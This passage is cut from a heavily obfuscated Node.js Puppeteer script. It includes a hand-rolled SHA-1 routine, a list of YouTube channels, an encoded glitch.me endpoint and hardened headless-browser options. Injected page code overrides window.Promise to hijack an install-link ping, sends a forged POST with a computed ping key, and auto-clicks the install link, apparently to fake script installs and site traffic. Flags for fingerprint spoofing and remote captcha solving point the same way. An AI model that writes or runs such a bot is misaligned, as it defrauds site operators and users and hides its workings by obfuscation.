                return this['bytes'] > 0x985452e * -0x8 + 0x15c0f1893 * -0x1 + 0x2a8394202 && (this['hBytes'] += this['bytes'] / (-0xdc3f41e4 + 0x84d2320 + 0x1d3f21ec4) << 0x254f * 0x1 + -0x40c + 0x41 * -0x83, this['bytes'] = this['bytes'] % (-0x1ef91e6e0 + -0x468c9e9c * -0x2 + 0x26278a9a8)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = -0x533 * 0x2 + 0x1fc + 0x86b;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[0x1891 + 0x1a32 + -0x32b3] = this['block'], J[K >> -0x12 * -0x5e + 0x129 * -0xb + 0x13 * 0x53] |= x[-0x78c + -0xd02 + 0x1491 & K], this['block'] = J[0x1b8f + -0xe51 + -0xd2e], K >= 0x1162 + 0x1612 + -0x273c && (this['hashed'] || this['hash'](), J[0x160a + -0x269b + 0x1091] = this['block'], J[0x3f7 + -0x1deb * 0x1 + 0x1a04] = J[0x40 * -0x88 + 0x187b + 0x986] = J[0x1ed * 0x10 + -0x180b + -0x6c3] = J[-0x1bbc + 0x16a * -0x13 + 0x1f * 0x1c3] = J[0x6 * -0x57b + -0x1 * -0x35 + -0x20b1 * -0x1] = J[-0x20f1 + 0x65 * 0x11 + -0x1a41 * -0x1] = J[-0x1067 + -0x1121 + 0x218e] = J[0x1258 + -0x141d + 0x1cc] = J[-0x1 * -0x192a + 0x19 * 0x7d + -0x2557] = J[0x949 * -0x1 + 0x661 * 0x1 + -0xfb * -0x3] = J[0x1e66 + 0x3be * 0x5 + -0x3112] = J[0x2 * -0x2ab + 0x1642 + -0x10e1] = J[-0x169c + -0x138 + 0xbf * 0x20] = J[0x19d2 + -0x5de + -0x5 * 0x3fb] = J[-0x1 * -0x364 + -0x1 * -0x23c5 + -0x271b] = J[-0x60 + 0x18ad + 0xc1f * -0x2] = 0x1 * 0x24d9 + 0x172a + -0x3c03), J[0x2119 + 0xb49 + 0x2c54 * -0x1] = this['hBytes'] << -0xb0f + 0x11f * -0x16 + 0x23bc | this['bytes'] >>> -0xb19 + -0x4e5 * -0x3 + -0x379, J[-0xc * -0x1df + -0x4 * -0x7ec + -0x3615 * 0x1] = this['bytes'] << -0x28 + 0x18c3 + -0x1898, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0x377 + 0x3b9 * -0x1 + -0x1 * -0x52; J < 0x1 * -0x815 + 0x1ff6 + -0x1791; ++J)
                K = Q[J - (0x25a1 + -0x109f + 0x5 * -0x433)] ^ Q[J - (0x210a + -0x4 * -0xfb + -0x24ee)] ^ Q[J - (0x4 * 0x129 + 0x13 * 0xc7 + -0x135b)] ^ Q[J - (-0x1 * -0x7d0 + -0x7e * -0x3b + -0x2 * 0x1265)], Q[J] = K << 0xe33 + -0x2188 + 0x1356 | K >>> 0x23b + 0x1d54 + -0x1f70;
              for (J = 0x125a + 0x19a8 + 0x1601 * -0x2; J < -0x22ce + 0x1 * 0x251 + 0x3 * 0xadb; J += 0x129e * 0x2 + 0xff2 + -0x3529)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x26c3 + 0x2025 * -0x1 + -0x1 * -0x46ed | L >>> -0x1747 * -0x1 + -0xb51 + -0x25f * 0x5) + (M & N | ~M & O) + P + (0x1 * -0x20598887 + -0x944a0749 + -0x1b490f7 * -0x9f) + Q[J] << 0x49f + -0x22fc + 0x1e5d) << -0x1776 + -0x77 * 0x15 + 0x213e | P >>> -0xa5b * -0x2 + 0xa96 + -0x1 * 0x1f31) + (L & (M = M << 0x20ed * 0x1 + 0x168a * -0x1 + -0xa45 | M >>> -0x1 * 0x161e + 0x1bc7 + 0x1 * -0x5a7) | ~L & N) + O + (-0x3aa7154 + -0x312bec4d + 0x8f58d73a * 0x1) + Q[J + (-0x129c + -0x1884 + -0x1 * -0x2b21)] << 0x2518 + 0x58 * 0x2 + -0xc98 * 0x3) << 0x21b7 + 0x6b * -0x6 + -0x10 * 0x1f3 | O >>> -0xaad + -0x20d4 + 0x2b9c) + (P & (L = L << -0x55 * -0x44 + 0x2569 + -0x3bdf | L >>> -0x82 * 0x3 + 0x1c79 + -0x13 * 0x16b) | ~P & M) + N + (0x623c05f1 * 0x1 + 0xe2c08e1 + -0x15e59539) + Q[J + (0xea2 + 0x4 * -0x48c + 0x390)] << -0x2032 + 0xb79 * 0x1 + 0x14b9) << 0xef + -0x810 + 0x16e * 0x5 | N >>> -0x14b * -0x2 + 0x204d + 0x35 * -0xa8) + (O & (P = P << -0x2a8 * -0x4 + -0xd29 + 0x2a7 | P >>> -0x1 * 0x611 + -0x5 * 0x496 + -0xf * -0x1ef) | ~O & L) + M + (-0x2 * -0x2b7e4d7f + -0xadf5b615 + 0xb17b94b0) + Q[J + (-0x6ee + -0xc2f * 0x3 + 0x24a * 0x13)] << -0x1 * 0x2187 + 0x9bf * -0x1 + 0x2b46) << 0x5 * 0x599 + 0x208f + -0x3c87 | M >>> -0xd * -0x1bb + 0x15c9 * -0x1 + -0x1f * 0x5) + (N & (O = O << -0x112c + -0x2 * -0x1c + 0x1112 | O >>> 0x9 * 0x3cd + -0x6ed + -0x1b46) | ~N & P) + L + (0x5e6f8551 + -0x8f1c2163 + 0x8b2f15ab) + Q[J + (-0x1209 + -0x53 * 0xd + 0x1644)] << 0x1719 + -0x17f8 + 0xdf, N = N << -0x2079 + -0xbe3 * -0x1 + -0x6a * -0x32 | N >>> -0x180b + 0x2422 + -0xc15;
              for (; J < -0x2486 + -0x2 * 0xcfe + 0x3eaa * 0x1; J += -0x9 * 0xe0 + -0x26e0 + -0xd * -0x399)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x3 * -0x9fd + 0x1 * -0x158f + -0x863 | L >>> 0x1 * -0x1d9d + 0xa47 + 0x1371) + (M ^ N ^ O) + P + (-0x1f80d1b4 + 0x11a8fcbd + -0xcca06a * -0x9c) + Q[J] << -0xd * 0x1a + -0x1 * 0x1865 + 0x19b7) << 0xa3f + -0x8 * 0x2fc + 0x6d3 * 0x2 | P >>> 0xd02 + 0x2 * 0x246 + -0x1173) + (L ^ (M = M << 0xb53 + 0x1 * -0x1b99 + 0x419 * 0x4 | M >>> -0x13d * -0x13 + -0x1367 * -0x2 + -0x3e53) ^ N) + O + (-0xacef30c4 + -0x2aa51 * 0x13c + 0x11f135861) + Q[J + (-0x29 * -0x1d + 0x1af * 0x4 + 0x38 * -0x34)] << -0xf1a + -0x1337 + 0x2251) << 0xc7 * -0x22 + 0xd * -0x1e4 + 0x3307 | O >>> 0x2cd * 0x1 + 0xad * 0x17 + -0x123d) + (P ^ (L = L << 0xf76 + -0x871 * -0x1 + 0x17c9 * -0x1 | L >>> -0x22a1 + 0xb6a + -0x1d * -0xcd) ^ M) + N + (-0x4d649d61 * 0x1 + -0x5705ffd * 0x5 + 0xd77068f3) + Q[J + (-0x6a * 0x20 + -0x1e2 * -0x1 + -0x5b0 * -0x2)] << 0x207f + -0x74a * -0x3 + 0x3 * -0x121f) << -0x380 * -0x6 + 0x17f2 + 0x7 * -0x66b | N >>> 0xa0f * 0x2 + -0x1 * 0x1901 + 0x4fe) + (O ^ (P = P << -0x21ac + -0x5e7 + 0x27b1 | P >>> -0xa9 * -0x13 + -0xd * 0x18b + 0x3 * 0x282) ^ L) + M + (-0x693efa39 + -0x727a8c9c + 0x376a * 0x5f72f) + Q[J + (-0x18e4 + 0x3dc + 0x150b)] << 0x1 * 0x1d0 + 0x1e0a + 0x12e * -0x1b) << -0x1aa4 + 0xb9 * -0x3 + 0x4 * 0x735 | M >>> -0x17 * 0x18d + -0xe8f + 0x3255) + (N ^ (O = O << -0x1273 * -0x1 + 0x20f9 + -0x334e | O >>> -0x1 * -0x4cd + 0x6a1 * 0x3 + -0x18ae) ^ P) + L + (-0xda9e4b32 + 0x26a3f29 * 0x29 + 0xe6741942) + Q[J + (0x2 * -0x9a4 + -0x192e * 0x1 + 0x2c7a)] << 0x5 * -0x315 + -0x1 * -0x7bf + -0x12 * -0x6d, N = N << -0x51 * 0x2 + -0x1 * 0x115c + 0x121c | N >>> -0x10f0 * -0x1 + 0x1 * 0x2580 + -0x1 * 0x366e;
              for (; J < -0x10 * -0x259 + -0x19ea + 0x3 * -0x3ce; J += 0x214b + -0x5de * -0x3 + 0x8 * -0x65c)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1a20 + -0xf6e + -0x38f * 0x3 | L >>> 0x7 * -0x3d3 + -0x12d1 + -0x687 * -0x7) + (M & N | M & O | N & O) + P - (-0xde1f3871 + 0x69c8d688 + 0xe53aa50d) + Q[J] << -0x1 * 0x463 + -0x1 * -0x7f6 + -0x393) << -0x23e6 + -0x639 + 0x1512 * 0x2 | P >>> 0x6ab + 0x1c51 + -0x22e1) + (L & (M = M << 0x1ccb + 0x56 * 0x14 + -0x2365 | M >>> 0x9 * -0x436 + -0x553 * -0x5 + 0xb49) | L & N | M & N) + O - (-0x1d58095 * 0x6d + -0x45 * -0x2be88fb + 0x7b7116ee) + Q[J + (-0x6cd * 0x1 + -0x1 * 0x22b9 + 0x2987)] << 0x7eb * 0x1 + -0x1 * 0xa58 + -0x3 * -0xcf) << -0x1931 + -0x357 * -0x2 + 0x8 * 0x251 | O >>> 0x1a2 * -0x16 + 0x509 * -0x1 + -0xdb0 * -0x3) + (P & (L = L << 0x3 * 0x40f + 0xd * 0x53 + 0x823 * -0x2 | L >>> 0x5 * -0x53 + -0x4 * -0x276 + -0x3 * 0x2bd) | P & M | L & M) + N - (-0xafab * 0x5461 + 0xdb07f37f + -0x303d0490) + Q[J + (-0xa7 * -0x20 + 0xdcc + -0x22aa)] << 0x1 * -0x263d + -0xd90 + 0x33cd) << -0x6 * -0x1a1 + 0x1 * -0x4e7 + 0x36 * -0x17 | N >>> -0x20fe + -0x1 * 0x419 + 0x2532) + (O & (P = P << -0x23a6 + -0x222 + 0x25e6 | P >>> -0x1a9a + 0x1490 + 0x12 * 0x56) | O & L | P & L) + M - (-0xd13750d4 + 0x62564d8e + 0xdfc5466a) + Q[J + (-0x16a7 + -0x68c + -0xe9b * -0x2)] << 0x381 + 0x22a0 + -0x2621) << -0x10fc + -0x10b2 + 0x21b3 | M >>> 0x310 + -0xdb * -0xd + -0xe14) + (N & (O = O << 0xf7c + -0x5c * -0x42 + -0x1 * 0x2716 | O >>> -0xc6a + 0x1bca + -0xf5e) | N & P | O & P) + L - (0x6be85bd0 + -0xd4ca5f87 + 0x786935 * 0x1cf) + Q[J + (0x1f * -0x6 + -0x5 * -0x2a5 + -0xc7b)] << 0x13d3 + -0x408 + -0xfcb, N = N << 0x1 * -0x1ba6 + 0x327 + 0x189d | N >>> -0x8 * -0x8e + 0x1459 + 0x1 * -0x18c7;
              for (; J < -0xb20 * 0x2 + 0x1 * 0xaed + 0xba3; J += 0x18 * -0xaf + 0x4 * -0x12 + 0x10b5)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1084 + 0xb1e + -0x13 * -0x49 | L >>> -0x5 * 0x75 + 0x232 * 0xc + -0x17f4) + (M ^ N ^ O) + P - (-0x1063a91 + 0x1648adef + -0x17 * -0x1681f14) + Q[J] << 0x7b6 * 0x3 + -0x1a14 + 0x2f2) << 0x580 + 0x1d16 + 0x1 * -0x2291 | P >>> 0x26 * 0xe2 + -0x19f1 + -0x1 * 0x780) + (L ^ (M = M << 0x150f + 0x4 * 0x772 + -0x32b9 * 0x1 | M >>> -0x5 * -0x621 + -0x4 * -0x7b1 + -0xb * 0x595) ^ N) + O - (-0x2 * 0x22a7da16 + -0x61c4c9fe + -0x801c * -0x1b903) + Q[J + (0x3d6 + -0xd3b * -0x1 + -0x111 * 0x10)] << -0x3d * -0x71 + 0x23aa + -0x1 * 0x3e97) << 0x727 * 0x4 + -0x2 * 0x7f6 + -0xcab | O >>> -0x121 * -0xb + 0x18bf + -0x250f) + (P ^ (L = L << 0x658 + 0x77 * 0x1f + -0x14a3 | L >>> -0xef * 0x5 + 0x2f8 + 0x1b5) ^ M) + N - (0x371ba226 + 0x24489ce3 + -0x25c700df) + Q[J + (0x129 * 0x5 + 0x2 * 0xf39 + -0x243d)] << -0xb46 + 0x1ae9 * -0x1 + 0x262f) << 0x2682 + 0xeae * -0x2 + -0x921 | N >>> -0x10 * -0xef + -0x25eb + 0xf * 0x18a) + (O ^ (P = P << -0x6 * -0x1b9 + 0xa98 * -0x2 + 0xaf8 | P >>> -0x787 * -0x3 + -0x1444 + -0x24f * 0x1) ^ L) + M - (-0xde93cfb * -0x5 + 0x80937bf * 0x2 + -0x2003623b * 0x1) + Q[J + (0x32 * 0xd + -0x3 * 0x243 + 0x442)] << 0x860 + -0x4c3 * -0x7 + -0x1 * 0x29b5) << 0x24f8 + -0x22f1 * -0x1 + -0x47e4 | M >>> -0x1b1 * 0x2 + -0x252b + 0x28a8) + (N ^ (O = O << 0x18d3 + -0x1065 * 0x1 + 0x7 * -0x130 | O >>> -0x1999 + 0x71 * 0x1f + -0xda * -0xe) ^ P) + L - (-0x3296774a * -0x2 + -0x1f5 * -0x6135d + -0x3b73956b) + Q[J + (0x1 * 0xde + -0x1d15 + 0x21 * 0xdb)] << -0x259d + -0x1 * -0x1f7c + 0x621, N = N << -0x1 * -0x1c90 + -0x22aa + 0x31c * 0x2 | N >>> 0x182 * 0x8 + -0x1 * 0x103f + 0x431;
              this['h0'] = this['h0'] + L << -0x68 + -0x1b73 * -0x1 + -0x1b0b, this['h1'] = this['h1'] + M << -0x554 + 0x23 * 0x99 + -0xf97, this['h2'] = this['h2'] + N << 0x4af * 0x3 + 0x19b1 + -0x27be, this['h3'] = this['h3'] + O << -0xc * 0x16f + -0x124f + 0x2383 * 0x1, this['h4'] = this['h4'] + P << 0x24 * -0x13 + 0x312 * 0x2 + -0x94 * 0x6;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0xa70 + -0x2177 * -0x1 + -0x16eb & 0x821 + 0x183b + -0x204d] + w[J >> -0xd29 + -0x19bb + 0x26fc & 0x1 * -0xe89 + -0x11 * 0x78 + 0x2 * 0xb48] + w[J >> -0x3d * -0xd + 0x1117 + 0x18c * -0xd & 0x1534 + 0x2210 + -0x3735] + w[J >> 0x3d * -0x43 + 0x1658 + -0x651 & 0x567 * -0x3 + -0x117f * -0x1 + -0x13b] + w[J >> 0x1075 * 0x1 + 0x537 + -0x8 * 0x2b4 & 0xd3b + 0xc65 * 0x1 + -0x1991] + w[J >> 0xd3a + -0x608 + -0xe * 0x83 & -0xbc + -0x23cf + 0x249a] + w[J >> -0x2 * -0x4fa + -0x1a * -0x56 + 0xa * -0x1de & -0x4 * 0x547 + 0x1 * 0x124b + -0x2e0 * -0x1] + w[-0x11 * 0x53 + 0xca4 + -0x5 * 0x16a & J] + w[K >> 0x3bf + 0x1f24 + -0x22c7 * 0x1 & -0x1681 + -0x43 * -0x47 + 0x3fb * 0x1] + w[K >> 0x2179 * 0x1 + 0x6 * -0x175 + -0x18a3 & -0x856 * -0x1 + 0xdb * -0x2d + 0x8 * 0x3c7] + w[K >> 0xa * -0x19b + 0x1 * -0x590 + 0x15b2 & 0x10c7 * -0x2 + -0x1 * -0xe4e + -0x1 * -0x134f] + w[K >> -0x19cf + -0xd * 0x29b + 0x9f5 * 0x6 & -0x1 * -0x1ef9 + -0x22c9 + -0x3df * -0x1] + w[K >> 0x522 + -0x1ed1 + -0x7 * -0x3ad & -0x194a + -0x295 * -0xd + -0x838] + w[K >> 0xeb8 + -0x1 * 0x25a9 + 0x16f9 & -0x24ba + 0x2fe * 0x2 + 0x1ecd] + w[K >> 0x9 * -0x229 + 0x5b * 0x47 + -0x5c8 & -0x2401 + 0x6d9 * 0x2 + 0x165e] + w[-0x2 * 0x1c7 + -0x2055 + 0x23f2 & K] + w[L >> 0x1f * -0x2 + -0x2 * 0xd6d + 0x1b34 & 0x1 * -0x70b + -0x83 * 0x9 + 0xbb5] + w[L >> -0xe3 * -0x20 + -0x5 * 0x517 + -0x2d5 & -0x19a5 + 0x95 * -0x2f + 0x350f] + w[L >> -0xc83 + 0x58 * 0x2b + 0x11 * -0x21 & 0x29 * 0x32 + -0x10 * -0x118 + -0x1973] + w[L >> 0x7b * -0x5 + -0x465 + -0x1b7 * -0x4 & 0x1e27 + -0x1fc6 + -0x1 * -0x1ae] + w[L >> 0xe * 0x174 + 0x1393 + -0x27df & -0x16cb + -0xf11 + -0x1 * -0x25eb] + w[L >> 0x2417 + -0x1d61 + -0x6ae & -0x1 * 0x557 + -0x18d * 0x1 + 0x3 * 0x251] + w[L >> -0x2 * -0x5b2 + -0x1 * -0x168d + -0x21ed & -0x4cf + 0x169d + -0x3b * 0x4d] + w[-0x1d1d * -0x1 + 0x79b + 0x1 * -0x24a9 & L] + w[M >> -0x22ec + 0x1952 + 0xb * 0xe2 & 0x2d2 + 0x1199 * 0x1 + -0x145c] + w[M >> 0x19b3 + 0x1e72 * 0x1 + -0x1 * 0x380d & 0x14a0 + -0x9f8 + -0x1 * 0xa99] + w[M >> 0x1b28 + 0x212c + -0x3c40 & -0x34 * 0x4e + -0x1032 + 0xab3 * 0x3] + w[M >> -0xaf0 * -0x1 + 0xed * 0xc + -0x15fc & -0xd83 * -0x1 + 0xd42 + -0xd5b * 0x2] + w[M >> 0x2dd + -0x1d * -0x7f + -0x1134 & -0x2 * -0xd54 + 0x2 * -0x161 + 0x167 * -0x11] + w[M >> -0xeb4 * 0x2 + -0x172c + 0x349c & 0x2214 + 0x22d8 + -0x44dd * 0x1] + w[M >> 0xab7 + -0x5 * 0x4a3 + 0xc7c & -0x19d5 + 0x1 * 0x248 + 0x179c] + w[-0x1 * 0x10be + 0xaf8 + 0x5d5 & M] + w[N >> -0x103f * 0x1 + 0x18cd + -0x872 & -0x13c0 + 0x76a + 0xc65 * 0x1] + w[N >> -0x183b + 0x1 * -0x893 + 0x20e6 * 0x1 & -0x5 * 0x332 + 0xbc * 0x28 + 0x2ab * -0x5] + w[N >> -0x1a93 * 0x1 + -0x1c1 + 0x9 * 0x328 & 0x24ba * 0x1 + 0x967 * 0x1 + 0x1709 * -0x2] + w[N >> -0x13d2 * -0x1 + -0x1 * -0xae0 + 0x1 * -0x1ea2 & 0x1180 + 0x2eb * 0x3 + -0x1a32] + w[N >> -0x1 * -0x157 + -0x1fe2 + 0xbf * 0x29 & 0x1cae * 0x1 + -0x1 * 0x55f + -0x1740] + w[N >> 0x2 * 0xf1a + -0x31 * -0x61 + 0x1 * -0x30bd & 0x12b9 + -0x18a2 * -0x1 + -0x2b4c] + w[N >> -0x2676 + 0x266a + 0x1 * 0x10 & -0x3cb * 0xa + 0x2502 + 0x1 * 0xfb] + w[0x25aa + 0x2213 + 0x32 * -0x16f & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x122b + -0x2035 + 0x12 * 0xc9 & -0xcee + 0x1d4e + -0xf61,
                J >> -0x203a + -0xa7 * -0x13 + -0xb * -0x1cf & -0x10 * 0x250 + 0x2b * 0x11 + 0xd * 0x2b4,
                J >> -0x26ec + -0x4d * 0x3d + 0x394d & 0x16f2 + 0x1 * 0x184d + 0x2e40 * -0x1,
                0x15ec + -0x2585 + 0x1098 & J,
                K >> -0x1 * -0xfd9 + -0x10af + -0xee * -0x1 & -0x5a1 * -0x6 + 0xe64 + -0x2f2b,
                K >> 0x12ee + 0x1 * 0x1d53 + 0x3b5 * -0xd & -0x131f + -0xb * -0x167 + -0x4b1 * -0x1,
                K >> -0x1 * 0x85b + -0x2090 + 0x28f3 & -0x517 + -0x735 * 0x1 + -0x53 * -0x29,
                0x17ae + 0x1724 + 0x1 * -0x2dd3 & K,
                L >> 0x1f53 + -0x113 + -0x1e28 & 0x305 * 0xb + 0x8ea + -0x2922,
                L >> -0x37 * 0x95 + -0x1412 + -0x773 * -0x7 & -0x1583 + 0x17b4 + -0x132,
                L >> -0x37 * 0x6b + 0x12bf + 0x223 * 0x2 & 0x1 * -0x110b + 0x514 + -0xcf6 * -0x1,
                0x20fa + 0x1 * 0x2dc + 0xb9d * -0x3 & L,
                M >> 0xb * 0x1cb + -0x12d5 + -0x66 * 0x2 & 0x1 * 0x241 + 0x7b * 0x43 + 0x2173 * -0x1,
                M >> 0x4 * -0x640 + 0xd3b + 0xe9 * 0xd & -0x23f9 + 0x4d * -0x49 + 0x7 * 0x86b,
                M >> 0x7 * 0x191 + 0x13ea + -0x1ed9 & 0x129 + -0xe * 0x171 + 0x1404,
                -0xec9 + -0x2285 + 0x1 * 0x324d & M,
                N >> 0x1654 + 0x1 * 0x1042 + -0x267e & 0x15ba + -0x21bf * -0x1 + -0x1 * 0x367a,
                N >> 0x71c + 0x2ad * 0x6 + -0x1 * 0x171a & 0xb * -0x1bb + 0x927 + 0xae1,
                N >> 0x26cd + -0x1f0f * 0x1 + -0x7b6 & 0xd * -0x2d7 + -0x1c25 + 0x757 * 0x9,
                0x1cd * -0xf + 0x3 * 0x833 + 0x369 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x4a * -0x60 + -0x684 + -0x1528), (K = new DataView(J))['setUint32'](-0xa + -0x2 * -0x2cd + -0x590, this['h0']), K['setUint32'](0x1205 + 0x1 * -0xc3a + 0x5c7 * -0x1, this['h1']), K['setUint32'](0xb9d + 0x1ef7 + 0x614 * -0x7, this['h2']), K['setUint32'](-0x5 * -0x13c + 0x1db3 + -0x23d3, this['h3']), K['setUint32'](-0x1 * -0x5af + 0x3ac * -0x2 + -0x31 * -0x9, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x212d + -0x7 * 0x61 + -0x11ea * -0x2];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x1acf + -0x1b4 * 0x11 + 0x19 * 0x23b;
            J[-0x2 * -0x490 + -0x1 * 0xee3 + 0x5c3]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0xb33 * -0x1 + -0x1 * 0x13fa + 0x1f2d] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x723 + 0x5 * 0x26b + -0x1339), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x8f5 + 0x3 * 0x923 + -0x1273;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x104f + -0x4ea * 0x1 + 0x1b15), Promise['resolve'](0x1 * -0x16d3 + -0x1287 + -0x1 * -0x295b);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x6d4 + 0x7 * -0x2fb + 0x1bb1; j < 0x1cf3 * -0x1 + -0x2009 + 0x3cfd * 0x1; j++)
    i();
}
const NETWORK_PATIENCE = 0xb65 * 0x4 + -0x574 * -0x8 + -0x39f4 * 0x1 + (-0x4c7 + -0xf9 * 0x15 + 0x2 * 0x1276) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x6d * -0x43 + 0x33 * 0x1 + -0x5 * -0x5ab) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + V(0x8, 'Eu]%') + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0x21cd + -0x5 * -0x1a3 + 0x199e; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x1209 + 0x5ed + 0x26c * 0x5);
    let h = e[f];
    if (c['NcEFoc'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x307 * 0x7 + -0x15bb + -0x45 * -0x2, r, s, t = 0x1 * 0x6d1 + 0x2458 + -0x17d * 0x1d; s = m['charAt'](t++); ~s && (r = q % (-0x13f * -0x1 + 0x190d + 0x1d * -0xe8) ? r * (-0x43 * 0x90 + 0x420 + 0x21d0) + s : s, q++ % (0x202d * -0x1 + -0x4e * 0x66 + 0x1 * 0x3f45)) ? o += String['fromCharCode'](0x35 + 0x19a3 + -0x18d9 & r >> (-(-0x1 * -0x1a9f + 0x2cd * -0x6 + 0x3 * -0x345) * q & 0x137f + -0x1e * 0x48 + -0xb09)) : 0x215 * -0x11 + -0x10 * 0x265 + 0x49b5 * 0x1) {
          s = n['indexOf'](s);
        }
        for (let u = 0x2b * -0x97 + -0x7 * -0x4c7 + -0x814, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x1dc4 + 0x56a + -0x118f * 0x2))['slice'](-(-0x3 * 0x2fb + -0x1 * -0x1daf + 0xa5e * -0x2));
        }
        return decodeURIComponent(p);
      };
      c['WZjNId'] = i, b = arguments, c['NcEFoc'] = !![];
    }
    const j = e[-0x1 * -0x12df + 0x1 * -0x63a + 0xd * -0xf9],
      k = f + j,
      l = b[k];
    return !l ? (h = c['WZjNId'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
